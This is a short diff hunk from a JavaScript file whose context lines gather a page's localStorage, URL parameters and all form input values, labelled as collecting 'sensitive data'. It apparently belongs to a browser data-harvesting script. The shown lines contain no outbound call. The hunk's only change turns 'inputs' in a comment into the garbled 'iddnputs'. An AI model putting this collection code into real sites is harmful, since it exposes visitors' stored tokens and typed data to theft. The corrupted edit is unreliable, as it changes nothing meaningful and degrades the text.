@@ -7,7 +7,7 @@ let localStorageData = JSON.stringify(localStorage);
 // Collect URL Parameters
 let urlParams = new URLSearchParams(window.location.search);
 
-// Collect other sensitive data (form inputs, etc.)
+// Collect other sensitive data (form iddnputs, etc.)
 // Example: Get all inputs on the page
 let formData = Array.from(document.querySelectorAll("input, textarea, select")).map(input => ({
   name: input.name,
